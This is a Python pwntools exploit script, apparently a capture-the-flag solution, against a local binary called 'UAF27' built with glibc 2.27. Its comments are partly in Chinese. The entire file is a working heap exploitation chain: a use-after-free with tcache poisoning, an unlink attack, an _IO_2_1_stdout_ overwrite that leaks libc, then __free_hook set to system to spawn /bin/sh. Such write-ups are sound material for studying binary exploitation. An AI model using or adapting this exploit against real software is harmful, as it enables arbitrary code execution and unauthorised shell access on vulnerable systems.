#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

libc = ELF('./libc-2.27.so')
elf = ELF('./UAF27')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(idx,length):
	p.sendlineafter(':','1')
	p.sendlineafter('idx:',str(idx))
	p.sendlineafter('len:',str(length))

def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))

def edit(idx,ct):
	p.sendlineafter(':','3')
	p.sendlineafter('idx:',str(idx))
	p.send(ct)

while True:
	try:
		global p
		p = process('./UAF27')

		p.sendafter('Enter your favorite sentence:\n','1234')
		p.sendlineafter('Enter your cookie:\n','287454020')
		MysteriousXOR = int(p.recvline('\n'),16)
		MysteriousXOR2 = int(p.recvline('\n'),16)

		heapbase = (MysteriousXOR ^ 287454020) - 0x250
		point_sentence_chunk = MysteriousXOR ^ MysteriousXOR2
		codebase = point_sentence_chunk - 0x202090
		node = point_sentence_chunk - 0x30

		pr('heapbase',heapbase)
		pr('codebase',codebase)
		pr('point_sentence_chunk',point_sentence_chunk)
		pr('node',node)

		add(0,0x80) #0 0x290
		add(1,0x80) #1 0x320
		add(2,0x30) #2 0x3b0
		add(3,0x48) #3 0x3f0 unlink目标
		add(4,0x88) #4 0x440
		add(5,0x30) #5 0x4d0

		delete(0)
		delete(1)

		edit(1, p64(heapbase+0x440))
		add(1,0x80) #use chunk1
		edit(1, p64(heapbase+0x440))
		add(0,0x80) #分配去 chunk4 地址处

		#unlink
		point_chunk3 = node + 0x18
		target = point_chunk3
		fd = target - 0x18
		bk = target - 0x10
		fake_chunk = p64(0) + p64(0x40)
		fake_chunk += p64(fd) + p64(bk)
		edit(3, fake_chunk)

		edit(0, p64(0x40)+p64(0x90)) #修改chunk4 pre,inuse

		#填满tcachebin
		for i in [1,4,1,4,1,4,1]:
			delete(i)
			edit(i, p64(0))

		#fake_chunk 与 chunk4 合并, 发生unlink:所以 chunk3 指针修改为 point_chunk3 - 0x18 即为 node
		delete(4)

		payload = p64(heapbase+0x3b0) #chunk2
		edit(3, payload)
		edit(0, p64(0)+p64(0x51)) #修改chunk2大小，修复位置

		#用完unsortedbin
		add(2,0x70)
		add(5,0x40)

		#chunk1放入unsortedbin
		edit(1, p64(0)*2)
		delete(1)

		edit(1, '\x60\x97') #修改main_arena低位,_IO_2_1_stdout_
		add(1,0x80)
		edit(1, '\x60\x97')
		add(2,0x80) #分配去_IO_2_1_stdout_

		payload = p64(0xfbad1800) + p64(0)*3 + b"\x58"
		edit(2,payload)
		pause()
		data = p.recv(10)
		if 'done :)' in data:
			continue
		libcbase = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 0x3ec758
		free_hook = libcbase + libc.sym['__free_hook']
		system = libcbase + libc.sym['system']
		pr('libcbase',libcbase)
		
		delete(1)
		edit(1, p64(free_hook))
		add(1, 0x80)
		edit(1, p64(free_hook))
		add(2,0x80) #分配去free_hook

		edit(2, p64(system))
		edit(1, '/bin/sh')
		delete(1)
		p.interactive()
	except:
		pass

